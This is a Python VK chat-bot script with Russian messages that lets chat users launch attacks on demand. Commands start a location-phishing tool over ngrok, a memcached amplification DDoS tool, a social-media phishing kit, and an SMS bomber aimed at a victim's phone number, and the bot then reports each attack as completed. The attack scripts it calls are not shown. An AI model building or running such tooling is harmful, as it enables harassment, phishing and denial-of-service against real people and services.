import requests
import vk_api
import random
import re
import os
import pyautogui
import time
from vk_api.keyboard import VkKeyboard, VkKeyboardColor
from vk_api.bot_longpoll import VkBotLongPoll, VkBotEventType
keyboard = VkKeyboard(one_time=True)
keyboard.add_button('Geo links', color=VkKeyboardColor.POSITIVE)

vk_session = vk_api.VkApi(token='Your token here')
longpoll_bot = VkBotLongPoll(vk_session, 'group id (int)')
vk = vk_session.get_api()

def seeker () :
    os.system('python3 /home/noname/get_seeker.py')

def memcrashed () :
    os.system('python3 /home/noname/get_memcrashed.py')

def socialphish () :
    os.system('python3 /home/noname/get_socialfish.py')


def spammer () :
    os.chdir("/home/noname/spymer")
    with open("conf.txt", "w") as f:
        new_string = event.object.text[9:] + ',' + str(event.object.from_id)
        f.write(new_string)
    os.system('python3 /home/noname/get_spammer.py')


for event in longpoll_bot.listen():
    connect_loop = True
    while connect_loop:
        try:
            response = requests.request('GET','some site here')
            connect_loop = False


            attachments = []
            from vk_api import VkUpload

            if event.type == VkBotEventType.MESSAGE_NEW:

                if event.object.text == '!Test':

                    vk.messages.send(
                        random_id=random.getrandbits(30),
                        peer_id=event.object.peer_id,
                        chat_id=event.object.chat_id,
                        message='Добро пожаловать на тест! \n Доступные команды: \n !Spammer -help \n !Spammer <phone_number>',
                    )

                    if len(event.object.fwd_messages) > 0 and event.object.fwd_messages[0].get('text') == 'Hello' :
                            vk.messages.send(
                                random_id=random.getrandbits(30),
                                chat_id=event.object.chat_id,
                                peer_id=event.object.peer_id,
                                message='Works!'
                            )


                if event.object.text == 'seeker/default' :
                    os.chdir("/home/noname/config_bot")
                    do_config = open('config.txt', 'w')
                    do_config.write(str(event.object.peer_id))
                    do_config.close()
                    vk.messages.send(
                        random_id=random.getrandbits(30),
                        chat_id=event.object.chat_id,
                        peer_id=event.object.peer_id,
                        message='Стартую сервис seeker...\n Запускаю PHP и ngrok сервер...'
                    )
                    seeker()
                    vk.messages.send(
                        random_id=random.getrandbits(30),
                        chat_id=event.object.chat_id,
                        peer_id=event.object.peer_id,
                        message='Атака завершена и прошла успешна.'
                    )

                if event.object.text == 'memcrashed/default' :
                    os.chdir("/home/noname/config_bot")
                    do_config = open('config.txt', 'w')
                    do_config.write(str(event.object.text[11:event.object.text.find('/')]))
                    do_config.close()
                    do_config = open('config.txt', 'r')
                    vk.messages.send(
                        random_id=random.getrandbits(30),
                        chat_id=event.object.chat_id,
                        peer_id=event.object.peer_id,
                        message='Внимание! \n Помните, что DDOS - это ужасно и уголовно наказуемо'
                    )
                    memcrashed()
                    vk.messages.send(
                        random_id=random.getrandbits(30),
                        chat_id=event.object.chat_id,
                        peer_id=event.object.peer_id,
                        message='Атака завершена и прошла успешна.'
                    )

                if event.object.text == 'socialfish' :
                    vk.messages.send(
                        random_id=random.getrandbits(30),
                        chat_id=event.object.chat_id,
                        peer_id=event.object.peer_id,
                        message='Its ok!'
                    )
                    socialphish()
                if event.object.text == '!Spammer -help' :
                    vk.messages.send(
                        random_id=random.getrandbits(30),
                        chat_id=event.object.chat_id,
                        peer_id=event.object.peer_id,
                        message='Сервис создан чтобы отправить большое количество СМС и таким образом заспамить жертву. \n Синтаксис вызова: \n !Spammer <phone_number> \n Например: \n !Spammer 71234567890'
                    )
                if event.object.text == '!Spammer' + event.object.text[8:] and event.object.text != '!Spammer -help' :
                    if event.object.text[8:] != '' :
                        print(event.object.text.find("1"))
                        try:
                            vk.messages.send(
                                random_id=random.getrandbits(30),
                                chat_id=event.object.chat_id,
                                peer_id=event.object.peer_id,
                                message='Запускаю атаку на телефон ' + event.object.text[9:]
                            )
                            spammer()
                            vk.messages.send(
                                random_id=random.getrandbits(30),
                                chat_id=event.object.chat_id,
                                peer_id=event.object.peer_id,
                                message='Атака завершена!'
                            )
                        except:
                            vk.messages.send(
                                random_id=random.getrandbits(30),
                                chat_id=event.object.chat_id,
                                peer_id=event.object.peer_id,
                                message='Что-то пошло не так. Проверь ввод и повтори попытку'
                            )
                    else:
                        vk.messages.send(
                            random_id=random.getrandbits(30),
                            chat_id=event.object.chat_id,
                            peer_id=event.object.peer_id,
                            message='Номер телефона не может быть пустой строкой'
                        )


        except requests.exceptions.RequestException:  # любая ошибка requests
            print('ConnectionError')
            continue